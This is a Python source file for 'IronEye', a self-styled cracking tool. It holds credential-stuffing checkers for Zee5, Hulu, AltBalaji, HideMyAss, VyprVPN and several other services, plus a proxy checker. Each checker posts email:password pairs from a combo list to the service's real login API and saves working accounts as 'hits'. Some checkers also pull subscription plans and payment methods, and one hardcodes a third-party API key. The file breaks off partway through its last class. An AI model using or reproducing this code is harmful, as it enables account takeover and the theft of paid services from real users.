"""
    ___                      _____
   |_ _| _ __   ___   _ __  | ____| _   _   ___
    | | | '__| / _\\ | '_ \\|  _|  | | | | / _ \\
    | | | |   | (_) || | | || |___ | |_| ||  __/
   |___||_|   \\___/ |_| |_||_____| \\__, \\___|
                                   |___/
       // Created By Akash Pattnaik \\
         // Telegram : @AKASH_AM1 \\
   // Github : github.com/BLUE-DEVIL1134 \\

Create Date : 09/10/2020
Latest Update On : 01/10/2021

[*] The Idea -
        The Idea Behind This Project Is That,
        When I Came On Telegram, I Didn't Had A RDP or Computer
        And Had To Struggle For It..

        Just Not To Happen With Any Other,
        This Project Was Made.

[*] Usage -
        apt update && apt upgrade -y
        apt install git -y
        apt install python -y

        git clone https://github.com/BLUE-DEVIL1134/IronEye.git
        cd IronEye
        pip install -r requirements.txt
        chmod +x *
        python -m IronEye
"""

# In-Built
import os
import platform
import sys
import time
from random import choice as c
import json
from threading import Thread

# Site-Packages
from colorama import Fore, Style, Back
from requests import get, Session, post

# IronEye
from . import __version__, logger

try:
    from Functions import *  # For CustomConfig
except ImportError:
    pass

# https://stackoverflow.com/questions/287871/how-to-print-colored-text-in-python
colors = ['\033[1;31m', '\033[1;32m', '\033[1;33m', '\033[1;34m', '\033[1;35m', '\033[1;36m']


def banner():
    logo = (f'{colors[1]} ___                     {colors[3]} _____\n'
            f'{colors[1]}|_ _| _ __   ___   _ __  {colors[3]}| ____| _   _   ___\n'
            f'{colors[1]} | | | \'__| / _ \\ | \'_ {colors[3]} \\|  _|  | | | | / _ \\ \n'
            f'{colors[1]} | | | |   | (_) || | | |{colors[3]}| |___ | |_| ||  __/\n'
            f'{colors[1]}|___||_|    \\___/ |_| |_|{colors[3]}|_____| \\__, | \\___|\n'
            f'{colors[3]}                                 |___/\n'
            f'{colors[4]}-->   The Original Linux Cracking Tool.\n'
            f'{colors[0]}       // Created By Akash Pattnaik \\\\\n'
            f'{colors[0]}        // Telegram : @AKASH_AM1 \\\\\n'
            f'{colors[0]}       // Website : v4.IronEye.cf \\\\\n'
            f'{colors[0]}   // Github : github.com/BLUE-DEVIL1134 \\\\\n'
            f'{colors[0]}     // [IronEye - DevVersion] - {__version__} \\\\\n{Fore.RESET}')
    return print(logo)


# I Love Clean Coding, So Class :happy:
class FreshToolsChecker:
    def __init__(self):
        self.checked = []
        self.hits = []
        self.file = input("Enter The Combos File Name : ")
        if os.path.exists(self.file):
            pass
        else:
            os.system('cls' if platform.system() == 'Windows' else 'clear')
            print(f"{colors[0]}No Such File Exits...")
            print(f"{colors[0]}Try Moving The File Into The Directory \"$HOME/IronEye/\"")
            print(f"{colors[3]}Process Exited With Code 69{Fore.RESET}")
            exit(69)
        self.data = open(self.file, "r").read()
        self.combos: int = self.data.count(":")
        self._api_url = "https://freshtools.net/rest/api/webservice/v1/login"
        for i in self.data.splitlines():
            self._check(i=i)
            self.display()

    def _check(self, i):
        self.content_len = len("{\"username\":\"{_user}\",\"password\":\"{_pass}\",\"notificationToken\":{_none}}"
                               .format(_user=i.split(":")[0], _pass=i.split(":")[1], _none=None))
        self.headers = {
            "accept": "*/*",
            "accept-encoding": "gzip, deflate, br",
            "accept-language": "en-US,en;q=0.9",
            "content-length": self.content_len,
            "content-type": "application/json",
            "origin": "https://freshtools.net",
            "referer": "https://freshtools.net/",
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-origin",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)"
                          " Chrome/84.0.4147.135 Safari/537.36"
        }
        self.post_data = "{\"username\":\"{_user}\",\"password\":\"{_pass}\",\"notificationToken\":{_none}}" \
            .format(_user=i.split(":")[0], _pass=i.split(":")[1], _none=None)
        self.req = str(post(self._api_url, data=self.post_data, headers=self.headers).text)
        if "success" in self.req:
            self.checked.append(i)
            self.hits.append(i)
            self._saver(i=i)
        else:
            pass

    def display(self):
        # Some People Use On Windows Instead Of Linux. :sed:
        os.system('cls' if platform.system() == 'Windows' else 'clear')
        print(f"Loaded Combos : {self.combos}")
        print(f"Checked : {len(self.checked)}")
        print(f"Hits : {len(self.hits)}")
        print(f"Checker By : @AKASH_AM1")

    def _saver(self, i):
        self.save_file = open("FreshTools_Hits.ir", "a")
        self.save_file.write(f"\n{i}")
        self.save_file.close()
        del self.save_file
        return None


# I Love Clean Coding, So Class :happy:
class ProxyChecker:
    def __init__(self):
        self.links = ["https://github.com/BLUE-DEVIL1134/", "https://instagram.com/",
                      "https://google.com/", "https://stackoverflow.com/", "https://netflix.com/login/",
                      "https://python.org/", "https://facebook.com/login/"]
        self.link = c(self.links)
        self.checked = []
        self.working = []
        self.file = input("Proxy File : ")
        if os.path.exists(self.file):
            pass
        else:
            os.system('cls' if platform.system() == 'Windows' else 'clear')
            print(f"{colors[0]}No Such File Exits...")
            print(f"{colors[0]}Try Moving The File Into The Directory \"$HOME/IronEye/\"")
            print(f"{colors[3]}Process Exited With Code 69{Fore.RESET}")
            exit(69)
        self.data = open(file=self.file, mode='r').read()
        self.proxies: int = self.data.count(':')
        for i in self.data.splitlines():
            self._checker(i=i)
            self.display()

    def display(self):
        # Some People Use On Windows Instead Of Linux. :sed:
        os.system('cls' if platform.system() == 'Windows' else 'clear')
        print(f"Loaded Proxies : {self.proxies}")
        print(f"Checked : {len(self.checked)}")
        print(f"Working : {len(self.working)}")
        print(f"Checking On : {self.link}")
        print(f"Checker By : @AKASH_AM1")

    def _checker(self, i):
        self.bot = Session()
        proxy_str = '{_0}:{_1}'.format(_0=i.split(':')[0], _1=i.split(':')[1])
        proxy_json = {'http': proxy_str, 'https': proxy_str}
        self.bot.proxies.update(proxy_json)
        try:
            self.bot.get(self.link, timeout=(10, 15))
            self.working.append(i)
            self.checked.append(i)
            var = open('live_proxies.ir', 'a')
            var.write(i)
            var.close()
            del var  # I Love Deleting Unwanted Vars
        except (ConnectionError, Exception):
            print("Your Sextem Seems To Have Some Connection Error...")
            self.checked.append(i)
        finally:
            self.bot.close()


# I Love Clean Coding, So Class :happy:
class Zee5Checker:
    def __init__(self):
        self.link = "https://userapi.zee5.com/v1/user/loginemail?email={_user}&password={_pass}"
        self.checked = []
        self.hits = []
        self.failed = []
        self.customs = []
        self.file = input("Combos File (\"Mail:Pass\") : ")
        if os.path.exists(self.file):
            pass
        else:
            os.system('cls' if platform.system() == 'Windows' else 'clear')
            print(f"{colors[0]}No Such File Exits...")
            print(f"{colors[3]}Process Exited With Code 69")
            exit(69)
        self.data = open(file=self.file, mode='r').read()
        self.combos: int = self.data.count(':')
        for i in self.data.splitlines():
            self._checker(i=i)
            self.display()

    def display(self):
        # Some People Use On Windows Instead Of Linux. :sed:
        os.system('cls' if platform.system() == 'Windows' else 'clear')
        print(c(colors))
        print(" _____             ____\n"
              "|__  /  ___   ___ | ___|\n"
              "  / /  / _ \\ / _ \\|___ \\\n"
              " / /_ |  __/|  __/ ___) |\n"
              "/____| \\___| \\___||____/\n")
        print(f"Loaded Combos : {self.combos}")
        print(f"Checked : {len(self.checked)}")
        print(f"Failed : {len(self.failed)}")
        print(f"Hits : {len(self.hits)}")
        print(f"Customs : {len(self.customs)}")
        print(r"Hits Saved To : Zee5_Hits.txt")
        print(f"Checker By : @AKASH_AM1 And @pureindialover")

    def _checker(self, i):
        self.headers = {
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.5",
            "User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:50.0) Gecko/20100101 Firefox/50.0",
            "Accept-Encoding": "gzip, deflate, br",
            "DNT": "1",
            "Connection": "keep-alive",
            "Upgrade-Insecure-Requests": "1",
            "Pragma": "no-cache",
            "Cache-Control": "no-cache"
        }
        self.page = get(self.link.format(_user=i.split(":")[0], _pass=i.split(":")[1]), headers=self.headers).text
        if "token" in str(self.page):
            self.checked.append(i)
            self._subscription_check(i=i, token=json.loads(self.page)["token"])
        else:
            self.failed.append(i)
            self.checked.append(i)
            return None

    def _subscription_check(self, i, token: str):
        self.req = get("https://subscriptionapi.zee5.com/v1/subscription?translation=en&include_active=true",
                       headers={
                           "User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:50.0) Gecko/20100101 Firefox/50.0",
                           "Pragma": "no-cache",
                           "Accept": "*/*",
                           "Authorization": f"bearer {token}"
                       }).json()
        try:
            _ = self.req[0]['subscription_plan']['title']
            _ = self.req[0]['state']
            self.hits.append(i)
            self._saver(i=i, _type='hit')
        except (KeyError, IndexError):
            self.customs.append(i)
            self._saver(i=i, _type='custom')

    def _saver(self, i, _type: str):
        if _type == 'hit':
            self.save_file = open("Zee5_Hits.txt", "a", encoding="utf-8")
            self.save_file.write(
                str(
                    "\n⫸⫘⫘⫘⫘⫘⫘IronEye⫘⫘⫘⫘⫘⫘⫷\n"
                    f"Combo - {i}\n"
                    f"Title - {self.req[0]['subscription_plan']['title']}\n"
                    f"System - {self.req[0]['subscription_plan']['system']}\n"
                    f"Country - {self.req[0]['subscription_plan']['country']}\n"
                    f"Supported Devices - "
                    f"{self.req[0]['subscription_plan']['number_of_supported_devices']}\n"
                    f"Start - {self.req[0]['subscription_start']}\n"
                    f"End - {self.req[0]['subscription_end']}\n"
                    f"State - {self.req[0]['state']}\n"
                    f"Region - {self.req[0]['region']}\n"
                    f"Ip - {self.req[0]['ip_address']}\n"
                    "⫸⫘⫘⫘⫘⫘⫘IronEye⫘⫘⫘⫘⫘⫘⫷"
                )
            )
            self.save_file.close()
            del self.save_file
            return None
        elif _type == 'custom':
            self.save_file = open("Zee5_Hits.txt", "a", encoding="utf-8")
            self.save_file.write(
                str(
                    f"\n⫸⫘⫘⫘⫘⫘⫘IronEye⫘⫘⫘⫘⫘⫘⫷\n"
                    f"{i}\n"
                    f"State - Custom / Free\n"
                    f"⫸⫘⫘⫘⫘⫘⫘IronEye⫘⫘⫘⫘⫘⫘⫷"
                )
            )
            self.save_file.close()
            del self.save_file
            return None
        else:
            self.save_file = open("Zee5_Hits.txt", "a", encoding="utf-8")
            self.save_file.write(
                str(
                    f"\n⫸⫘⫘⫘⫘⫘⫘IronEye⫘⫘⫘⫘⫘⫘⫷\n"
                    f"{i}\n"
                    f"State - Neither Hit Nor Custom\n"
                    f"⫸⫘⫘⫘⫘⫘⫘IronEye⫘⫘⫘⫘⫘⫘⫷"
                )
            )
            self.save_file.close()
            del self.save_file
            return None


# I Love Clean Coding, So Class :happy:
class HideMyAssChecker:
    def __init__(self):
        self.link = "https://securenetconnection.com/clapi/v1.5/user/login"
        self.checked = []
        self.hits = []
        self.failed = []
        self.file = input("Combos File Name : ")
        if os.path.exists(self.file):
            pass
        else:
            os.system('cls' if platform.system() == 'Windows' else 'clear')
            print(f"{colors[0]}No Such File Exits...")
            print(f"{colors[0]}Try Moving The File Into The Directory \"$HOME/IronEye/\"")
            print(f"{colors[3]}Process Exited With Code 69{Fore.RESET}")
            exit(69)
        self.data = open(file=self.file, mode='r').read()
        self.combos: int = self.data.count(':')
        for i in self.data.splitlines():
            self._checker(i=i)
            self.display()

    def display(self):
        # Some People Use On Windows Instead Of Linux. :sed:
        os.system('cls' if platform.system() == 'Windows' else 'clear')
        print(c(colors))
        print(" _   _  __  __     _\n"
              "| | | ||  \\/  |   / \\\n"
              "| |_| || |\\/| |  / _ \\\n"
              "|  _  || |  | | / ___ \\\n"
              "|_| |_||_|  |_|/_/   \\_\\\n")
        print(f"Loaded Combos : {self.combos}")
        print(f"Checked : {len(self.checked)}")
        print(f"Failed : {len(self.failed)}")
        print(f"Hits : {len(self.hits)}")
        print(r"Hits Saved To : HideMyAss_Hits.ir")
        print(f"Checker By : @AKASH_AM1")

    def _checker(self, i):
        self.headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko",
            "Pragma": "no-cache",
            "Accept": "*/*"
        }
        self.post_data = f"username={i.split(':')[0]}&password={i.split(':')[1]}"
        self.req = post(url=self.link, data=self.post_data, headers=self.headers).text
        if "plan\":\"" in self.req:
            self.checked.append(i)
            self.hits.append(i)
            self._saver(i=i)
        else:
            self.checked.append(i)
            self.failed.append(i)
            return None

    def _saver(self, i):
        self.save_file = open("HideMyAss_Hits.ir", "a")
        self.save_file.write(f"\n{i}")
        self.save_file.close()
        del self.save_file
        return None


# I Love Clean Coding, So Class :happy:
class CryptoAd_Checker:
    def __init__(self):
        self.link = "https://my.crypto.ad/login"
        self.checked = []
        self.hits = []
        self.failed = []
        self.file = input("Combos File Name : ")
        if os.path.exists(self.file):
            pass
        else:
            os.system('cls' if platform.system() == 'Windows' else 'clear')
            print(f"{colors[0]}No Such File Exits...")
            print(f"{colors[0]}Try Moving The File Into The Directory \"$HOME/IronEye/\"")
            print(f"{colors[3]}Process Exited With Code 69{Fore.RESET}")
            exit(69)
        self.data = open(file=self.file, mode='r').read()
        self.combos: int = self.data.count(':')
        for i in self.data.splitlines():
            self._checker(i=i)
            self.display()

    def display(self):
        # Some People Use On Windows Instead Of Linux. :sed:
        os.system('cls' if platform.system() == 'Windows' else 'clear')
        print(c(colors))
        print("  ____                      _\n"
              " / ___| _ __  _   _  _ __  | |_   ___\n"
              "| |    | '__|| | | || '_ \\ | __| / _ \\\n"
              "| |___ | |   | |_| || |_) || |_ | (_) |\n"
              " \\____||_|    \\__, || .__/  \\__| \\___/\n"
              "              |___/ |_|\n")
        print("Crypto.Ad Checker")
        print(f"Loaded Combos : {self.combos}")
        print(f"Checked : {len(self.checked)}")
        print(f"Failed : {len(self.failed)}")
        print(f"Hits : {len(self.hits)}")
        print(r"Hits Saved To : Crypto_Ad_Hits.ir")
        print(f"Checker By : @AKASH_AM1")

    def _checker(self, i):
        self.post_data = f"email={i.split(':')[0]}&password={i.split(':')[1]}&signin="
        self.headers = {
            "scheme": "https",
            "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;"
                      "q=0.8,application/signed-exchange;v=b3;q=0.9",
            "accept-encoding": "gzip, deflate, br",
            "accept-language": "en-US,en;q=0.9,fa;q=0.8",
            "cache-control": "no-cache",
            "content-length": len(self.post_data),
            "origin": "https://my.crypto.ad",
            "pragma": "no-cache",
            "referer": "https://my.crypto.ad/",
            "sec-fetch-dest": "document",
            "sec-fetch-mode": "navigate",
            "sec-fetch-site": "same-origin",
            "sec-fetch-user": "?1",
            "upgrade-insecure-requests": "1",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85."
                          "0.4183.102 Safari/537.36",
        }
        self.req = post(url=self.link, headers=self.headers, data=self.post_data).text
        if "Logout" in self.req:
            self.checked.append(i)
            self.hits.append(i)
            self._saver(i=i)
        else:
            self.checked.append(i)
            self.failed.append(i)
            return None

    def _saver(self, i):
        self.save_file = open("Crypto_Ad_Hits.ir", "a")
        self.save_file.write(f"\n{i}")
        self.save_file.close()
        del self.save_file
        return None


# I Love Clean Coding, So Class :happy:
class AltBalajiChecker:
    def __init__(self):
        self.link = "https://api.cloud.altbalaji.com/accounts/login?domain=IN"
        self.checked = []
        self.hits = []
        self.failed = []
        self.customs = []
        self.file: str = input("Combos File : ")
        if os.path.exists(self.file):
            pass
        else:
            os.system('cls' if platform.system() == 'Windows' else 'clear')
            print(f"{colors[0]}No Such File Exits...")
            print(f"{colors[0]}Try Moving The File Into The Directory \"$HOME/IronEye/\"")
            print(f"{colors[3]}Process Exited With Code 69{Fore.RESET}")
            exit(69)
        self.data = open(file=self.file, mode='r').read()
        self.combos: int = self.data.count(':')
        for i in self.data.splitlines():
            self._checker(i=i)
            self.display()

    def display(self):
        # Some People Use On Windows Instead Of Linux. :sed:
        os.system('cls' if platform.system() == 'Windows' else 'clear')
        print("    _     _  _           ____\n"
              "   / \\   | || |_        | __ )\n"
              "  / _ \\  | || __| _____ |  _ \\\n"
              " / ___ \\ | || |_ |_____|| |_) |\n"
              "/_/   \\_\\|_| \\__|       |____/\n")
        print(f"Loaded Combos : {self.combos}")
        print(f"Checked : {len(self.checked)}")
        print(f"Failed : {len(self.failed)}")
        print(f"Hits : {len(self.hits)}")
        print(f"Customs : {len(self.customs)}")
        print(r"Hits Saved To : AltBalaji_Hits.ir")
        print(f"Checker By : @AKASH_AM1 And @pureindialover")

    def _checker(self, i):
        self.post_data = "{\"username\" : \"" + i.split(":")[0] + "\", \"password\" : \"" + i.split(":")[1] + "\"}"
        self.headers = {'Host': "api.cloud.altbalaji.com",
                        "Connection": 'keep-alive',
                        "Accept": 'application/json, text/plain, */*',
                        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
                                      "AppleWebKit/537.36 (KHTML, like Gecko) "
                                      "Chrome/85.0.4183.102 "
                                      "Safari/537.36",
                        "Content-Type": "application/json",
                        "Origin": "https://www.altbalaji.com",
                        "Sec-Fetch-Site": "same-site",
                        "Sec-Fetch-Mode": "cors",
                        "Sec-Fetch-Dest": "empty",
                        "Referer": "https://www.altbalaji.com/",
                        "Accept-Language": "en-US,en;q=0.9",
                        "Accept-Encoding": "gzip, deflate",
                        "Content-Length": "56"}
        self._post = post(url=self.link, data=self.post_data, headers=self.headers)
        if self._post.text.startswith("{\"status\":\"ok\"") and 'session_token' in self._post.text:
            self._subscription_check(session_token=self._post.json()[0]["session_token"], i=i)
        else:
            self.checked.append(i)
            self.failed.append(i)
            return None

    def _subscription_check(self, session_token, i):
        self.req = get("https://payment.cloud.altbalaji.com/accounts/orders?limit=12&order_status=ok&domain=IN",
                       headers={
                           "Host": "payment.cloud.altbalaji.com",
                           "xssession": f"{session_token}",
                           "accept-encoding": "gzip",
                           "user-agent": "okhttp/3.12.7"
                       }).json()[0]
        if "{\"orders\": []" in str(self.req):
            self.checked.append(i)
            self.customs.append(i)
            self._saver(i=i, _type="custom")
            return False
        try:
            _ = self.req["orders"][0]["product"]["options"]["default"]["currency"]
            self._saver(i=i, _type='hit')
        except KeyError:
            self._saver(i=i, _type='None')

    def _saver(self, i, _type: str):
        if _type == 'hit':
            self.save_file = open("AltBalaji_Hits.ir", "a", encoding="utf-8")
            self.save_file.write("\n⫸⫘⫘⫘⫘⫘⫘IronEye⫘⫘⫘⫘⫘⫘⫷\n"
                                 f"Combo - {i}\n"
                                 f'Plan - {self.req["orders"][0]["product"]["titles"]["default"]}\n'
                                 f'Currency - {self.req["orders"][0]["product"]["options"]["default"]["currency"]}\n'
                                 f'Recurring - {self.req["orders"][0]["product"]["recurring"]}\n'
                                 f'Plan Amount - {self.req["orders"][0]["price"]["real_amount"]}\n'
                                 f'Valid From - {self.req["orders"][0]["dates"]["valid_from"]}\n'
                                 f'Valid Till - {self.req["orders"][0]["dates"]["valid_to"]}\n'
                                 f'Payment Method - {self.req["orders"][0]["payment_method"]}\n'
                                 f'⫸⫘⫘⫘⫘⫘⫘IronEye⫘⫘⫘⫘⫘⫘⫷')
            self.save_file.close()
            del self.save_file
            return None
        elif _type == 'custom':
            self.save_file = open("AltBalaji_Hits.ir", "a", encoding="utf-8")
            self.save_file.write(f"\n⫸⫘⫘⫘⫘⫘⫘IronEye⫘⫘⫘⫘⫘⫘⫷\n"
                                 f"{i}\n"
                                 f"State - Custom / Free\n"
                                 f"⫸⫘⫘⫘⫘⫘⫘IronEye⫘⫘⫘⫘⫘⫘⫷")
            self.save_file.close()
            del self.save_file
            return None
        else:
            self.save_file = open("AltBalaji_Hits.ir", "a", encoding="utf-8")
            self.save_file.write(f"\n⫸⫘⫘⫘⫘⫘⫘IronEye⫘⫘⫘⫘⫘⫘⫷\n"
                                 f"{i}\n"
                                 f"State - Neither Hit Nor Custom\n"
                                 f"⫸⫘⫘⫘⫘⫘⫘IronEye⫘⫘⫘⫘⫘⫘⫷")
            self.save_file.close()
            del self.save_file
            return None


# I Love Clean Coding, So Class :happy:
class McmxChecker:
    def __init__(self):
        self.url = "https://mcmx.online/login"
        self.checked = []
        self.hits = []
        self.failed = []
        self.file = input("Combos File (\"Mail:Pass\") : ")
        if os.path.exists(self.file):
            pass
        else:
            os.system('cls' if platform.system() == 'Windows' else 'clear')
            print(f"{colors[0]}No Such File Exits...")
            print(f"{colors[0]}Try Moving The File Into The Directory \"$HOME/IronEye/\"")
            print(f"{colors[3]}Process Exited With Code 69{Fore.RESET}")
            exit(69)
        self.data = open(file=self.file, mode='r', encoding="UTF-8").read()
        self.combos: int = self.data.count(':')
        for i in self.data.splitlines():
            self._checker(i=i)
            self.display()

    def _checker(self, i):
        self.headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) "
                          "Chrome/83.0.4103.106 Safari/537.36",
            "Pragma": "no-cache",
            "Accept": "*/*",
            "origin": "https://mcmx.online",
            "referer": "https://mcmx.online/"
        }
        self.post_data = f"email={i.split(':')[0]}&password={i.split(':')[1]}"
        self.response = str(post(url=self.url, data=self.post_data, headers=self.headers).text)
        if "Hashes Last 24 hours" in self.response or \
                "Mining Performance (TH)" in self.response or \
                "Next Payment" in self.response:
            self.checked.append(i)
            self.hits.append(i)
            self._saver(i=i)
        else:
            self.checked.append(i)
            self.failed.append(i)
            return None

    def display(self):
        # Some People Use On Windows Instead Of Linux. :sed:
        os.system('cls' if platform.system() == 'Windows' else 'clear')
        print(c(colors))
        print(" __  __        __  __\n"
              "|  \\/  |  ___ |  \\/  |__  __\n"
              "| |\\/| | / __|| |\\/| |\\ \\/ /\n"
              "| |  | || (__ | |  | | >  <\n"
              "|_|  |_| \\___||_|  |_|/_/\\_\\\n")
        print(f"Loaded Combos : {self.combos}")
        print(f"Checked : {len(self.checked)}")
        print(f"Failed : {len(self.failed)}")
        print(f"Hits : {len(self.hits)}")
        print(r"Hits Saved To : McMx_Hits.ir")
        print(f"Tool And Checker By : @AKASH_AM1")

    def _saver(self, i):
        self.save_file = open("McMx_Hits.ir", "a")
        self.save_file.write(f"\n{i}")
        self.save_file.close()
        del self.save_file
        return None


# I Love Clean Coding, So Class :happy:
class Hulu:
    def __init__(self):
        self.url = "https://auth.hulu.com/v1/device/password/authenticate"
        self.checked = []
        self.hits = []
        self.failed = []
        self.file = input("Combos File (\"Mail:Pass\") : ")
        if os.path.exists(self.file):
            pass
        else:
            os.system('cls' if platform.system() == 'Windows' else 'clear')
            print(f"{colors[0]}No Such File Exits...")
            print(f"{colors[0]}Try Moving The File Into The Directory \"$HOME/IronEye/\"")
            print(f"{colors[3]}Process Exited With Code 69{Fore.RESET}")
            exit(69)
        self.data = open(file=self.file, mode='r', encoding="UTF-8").read()
        self.combos: int = self.data.count(':')
        for i in self.data.splitlines():
            self._checker(i=i)
            self.display()

    def _checker(self, i):
        self.headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko",
            "Pragma": "no-cache",
            "Accept": "*/*"
        }
        self.post_data = (f'affiliate_name=apple&friendly_name=Andy%27s+Iphone&password={i.split(":")[1]}'
                          f'&product_name=iPhone7%2C2&serial_number=00001e854946e42b1cbf418fe7d2dcd64df0'
                          f'&user_email={i.split(":")[0]}')
        self.response = str(post(url=self.url, data=self.post_data, headers=self.headers).text)
        if 'user_token' in self.response:
            self.checked.append(i)
            self.hits.append(i)
            self._saver(i=i)
        else:
            self.checked.append(i)
            self.failed.append(i)
            return None

    def display(self):
        # Some People Use On Windows Instead Of Linux. :sed:
        os.system('cls' if platform.system() == 'Windows' else 'clear')
        print(c(colors))
        print(" _   _         _\n"
              "| | | | _   _ | | _   _\n"
              "| |_| || | | || || | | |\n"
              "|  _  || |_| || || |_| |\n"
              "|_| |_| \\__,_||_| \\__,_|\n")
        print(f"Loaded Combos : {self.combos}")
        print(f"Checked : {len(self.checked)}")
        print(f"Failed : {len(self.failed)}")
        print(f"Hits : {len(self.hits)}")
        print(r"Hits Saved To : Hulu_Hits.ir")
        print(r"Tool And Checker By : @AKASH_AM1")
        print(r"Tool Channel : @IndianBots")

    def _saver(self, i):
        self.save_file = open("Hulu_Hits.ir", "a")
        self.save_file.write(f"\n{i}")
        self.save_file.close()
        del self.save_file
        return None


# I Love Clean Coding, So Class :happy:
class Aha:
    def __init__(self):
        self.url = ("https://prod-api.viewlift.com/identity/signin?platform=android&device=android_phone&site=aha-tv"
                    f"&deviceId=Ngw7-qy710&9jwpwu&deviceName=Coolpad%20Note3Lite")
        self.checked = []
        self.hits = []
        self.failed = []
        self.file = input("Combos File (\"Mail:Pass\") : ")
        if os.path.exists(self.file):
            pass
        else:
            os.system('cls' if platform.system() == 'Windows' else 'clear')
            print(f"{colors[0]}No Such File Exits...")
            print(f"{colors[0]}Try Moving The File Into The Directory \"$HOME/IronEye/\"")
            print(f"{colors[3]}Process Exited With Code 69{Fore.RESET}")
            exit(69)
        self.data = open(file=self.file, mode='r', encoding="UTF-8").read()
        self.combos: int = self.data.count(':')
        for i in self.data.splitlines():
            self._checker(i=i)
            self.display()

    def _checker(self, i):
        self.headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko",
            "Pragma": "no-cache",
            "Accept": "*/*",
            "Host": "prod-api.viewlift.com",
            "x-api-key": "mm5x3sykpTamkSqfB3CCe3qJBRTsOA91aHDv2e8x",
            "content-type": "application/json; charset=UTF-8",
            "content-length": "109",
            "accept-encoding": "gzip",
            "user-agent": "okhttp/4.9.0"
        }
        self.post_data = ('{"email": "' + i.split(":")[0] + '", "password": ' + i.split(":")[1] + ','
                          '"emailConsent": false, "ignorePassword ": false}')
        self.response = str(post(url=self.url, data=self.post_data, headers=self.headers).text)
        if 'authorizationToken' in self.response:
            self.checked.append(i)
            self.hits.append(i)
            self._saver(i=i)
        else:
            self.checked.append(i)
            self.failed.append(i)
            return None

    def display(self):
        # Some People Use On Windows Instead Of Linux. :sed:
        os.system('cls' if platform.system() == 'Windows' else 'clear')
        print(c(colors))
        print("    _     _\n"
              "   / \\   | |__    __ _\n"
              "  / _ \\  | '_ \\  / _` |\n"
              " / ___ \\ | | | || (_| |\n"
              "/_/   \\_\\|_| |_| \\__,_|\n")
        print(f"Loaded Combos : {self.combos}")
        print(f"Checked : {len(self.checked)}")
        print(f"Failed : {len(self.failed)}")
        print(f"Hits : {len(self.hits)}")
        print(r"Hits Saved To : Aha_Hits.ir")
        print(r"Tool And Checker By : @AKASH_AM1")
        print(r"Tool Channel : @IndianBots")

    def _saver(self, i):
        self.save_file = open("Aha_Hits.ir", "a")
        self.save_file.write(f"\n{i}")
        self.save_file.close()
        del self.save_file
        return None


# I Love Clean Coding, So Class :happy:
class FreeKaMaal:
    def __init__(self):
        self.url = "https://fkmapi.freekaamaal.com/login"
        self.checked = []
        self.hits = []
        self.failed = []
        self.file = input("Combos File (\"Mail:Pass\") : ")
        if os.path.exists(self.file):
            pass
        else:
            os.system('cls' if platform.system() == 'Windows' else 'clear')
            print(f"{colors[0]}No Such File Exits...")
            print(f"{colors[0]}Try Moving The File Into The Directory \"$HOME/IronEye/\"")
            print(f"{colors[3]}Process Exited With Code 69{Fore.RESET}")
            exit(69)
        self.data = open(file=self.file, mode='r', encoding="UTF-8").read()
        self.combos: int = self.data.count(':')
        for i in self.data.splitlines():
            self._checker(i=i)
            self.display()

    def _checker(self, i):
        self.headers = {
            "Content-Type": "text/html; charset=UTF-8",
            "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 5.1.1; SM-G955N Build/NRD90M.G955NKSU1AQDC)",
            "Host": "fkmapi.freekaamaal.com",
            "Connection": "Keep-Alive",
            "Accept-Encoding": "gzip, deflate",
            "Content-Length": "151",
            "Date": "Sun, 15 Nov 2020 08:32:41 GMT",
            "Server": "Apache/2.4.18 (Ubuntu)",
            "Access-Control-Allow-Origin": "*",
            "Vary": "Accept-Encoding",
            "Content-Encoding": "gzip",
            "Keep-Alive": "timeout=5, max=100"
        }
        self.post_data = ('{"login_type": "1", "email": "' + i.split(":")[0] + '", "pass": "' + i.split(":")[1] + '", '
                          '"device_id": "","location": "", "langlat": ""}')
        self.response = str(post(url=self.url, data=self.post_data, headers=self.headers).text)
        if '"status":"1","message":"' in self.response \
                or "Welcome" in self.response \
                or ", nice to have yo" in self.response:
            self.checked.append(i)
            self.hits.append(i)
            self._saver(i=i)
        else:
            self.checked.append(i)
            self.failed.append(i)
            return None

    def display(self):
        # Some People Use On Windows Instead Of Linux. :sed:
        os.system('cls' if platform.system() == 'Windows' else 'clear')
        print(c(colors))
        print(" _____                    _  __ __  __\n"
              "|  ___| _ __   ___   ___ | |/ /|  \\/  |\n"
              "| |_   | '__| / _ \\ / _ \\| ' / | |\\/| |\n"
              "|  _|  | |   |  __/|  __/| . \\ | |  | |\n"
              "|_|    |_|    \\___| \\___||_|\\_\\|_|  |_|\n")
        print(f"Loaded Combos : {self.combos}")
        print(f"Checked : {len(self.checked)}")
        print(f"Failed : {len(self.failed)}")
        print(f"Hits : {len(self.hits)}")
        print(r"Hits Saved To : FreeKaMaal_Hits.ir")
        print(r"Tool And Checker By : @AKASH_AM1")
        print(r"Tool Channel : @IndianBots")

    def _saver(self, i):
        self.save_file = open("FreeKaMaal_Hits.ir", "a")
        self.save_file.write(f"\n{i}")
        self.save_file.close()
        del self.save_file
        return None


# I Love Clean Coding, So Class :happy:
class VyprVpn:
    def __init__(self):
        self.url = "https://api.goldenfrog.com/settings"
        self.checked = []
        self.hits = []
        self.failed = []
        try:
            self.file = input("Combos File (\"Mail:Pass\") : ")
        except KeyboardInterrupt:
            pass
        if os.path.exists(self.file):
            pass
        else:
            os.system('cls' if platform.system() == 'Windows' else 'clear')
            print(f"{colors[0]}No Such File Exits...")
